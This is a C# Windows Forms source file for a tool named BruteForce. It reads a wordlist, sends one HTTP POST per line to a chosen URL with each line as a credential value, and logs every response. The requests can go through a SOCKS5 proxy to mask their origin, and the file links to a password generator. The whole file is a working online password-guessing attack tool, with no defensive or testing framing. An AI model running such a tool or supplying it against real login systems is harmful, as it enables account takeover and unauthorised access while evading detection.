using MihaZupan;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Windows.Forms;

namespace BruteForce
{
    public partial class Form1 : Form
    {

        private string file { get; set; }
        public string url { get; set; }
        public string paramName { get; set; }
        public string paramValue { get; set; }
        public string keyName { get; set; }
        public bool isJson { get; set; }

        public string ProxyIP { get; set; }
        public string ProxyPORT { get; set; }

        public Form1()
        {
            InitializeComponent();
        }

        private void btnAttack_Click(object sender, EventArgs e)
        {
           try
            {
                setParameters();

                if (File.Exists(file))
                {
                    string[] lines = File.ReadAllLines(file);
                    foreach (var line in lines)
                    {
                        HttpClient client = null;
                        var handler = GetHandler();

                        if (handler != null)
                        {
                             client = new HttpClient(handler: handler, disposeHandler: true);
                        }
                        else
                        {
                            client = new HttpClient();
                        }
                        
                        var json = "{ \"" + paramName + "\" : \"" + paramValue + "\",  " +
                            " \"" + keyName + "\" : \"" + line + "\"}";

                        if (isJson)
                        {
                            var content = new StringContent(json, Encoding.UTF8, "application/json");
                            var r = client.PostAsync(url, content).Result;
                            var c = r.Content.ReadAsStringAsync().Result;
                            addRowToDataGrid(r, c, json);
                        }
                        else
                        {
                            var content = new FormUrlEncodedContent(new[]
                            {
                                new KeyValuePair<string, string>(paramName, paramValue),
                                new KeyValuePair<string, string>(keyName, line),
                            });

                            var r = client.PostAsync(url, content).Result;
                            var c = r.Content.ReadAsStringAsync().Result;
                            addRowToDataGrid(r, c, json);
                        }
                    }
                }
            }catch(Exception)
            {
                throw;
            }
        }

        private void addRowToDataGrid(HttpResponseMessage r, string content, string parametros)
        {
            dataGridView.Rows.Add(r.StatusCode.ToString(), r.Headers, content, parametros);
        }

        private HttpClientHandler GetHandler()
        {
            try
            {
                if(ProxyIP.Length > 0 && ProxyPORT.Length > 0)
                {
                    var proxy = new HttpToSocks5Proxy(ProxyIP, Int16.Parse(ProxyPORT));
                    var handler = new HttpClientHandler { Proxy = proxy };
                    return handler;
                }
                else
                {
                    throw new Exception();
                }
                
            }
            catch (Exception)
            {
                return null;
            }
        }

        private void btnSelectFile_Click(object sender, EventArgs e)
        {
            var result = openFileDialog.ShowDialog();
            if (result == DialogResult.OK)
            {
                file = openFileDialog.FileName;
                txtFileName.Text = file;
            }
        }

        private void setParameters()
        {
            if(this.txtParamName.Text.Equals("") || this.txtParamValue.Text.Equals("") || this.txtKeyName.Text.Equals(""))
            {
                MessageBox.Show("Rellena bien los campos");
            }
            else
            {
                paramName = this.txtParamName.Text;
                paramValue = this.txtParamValue.Text;
                keyName = this.txtKeyName.Text;
                isJson = this.checkIsJson.Checked;
                ProxyIP = this.txtProxyIp.Text;
                ProxyPORT = this.txtProxyPort.Text;
            }
        }

        private void passwordGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PasswordGenerator passwordGenerator = new PasswordGenerator();
            passwordGenerator.Show();
        }
    }
}
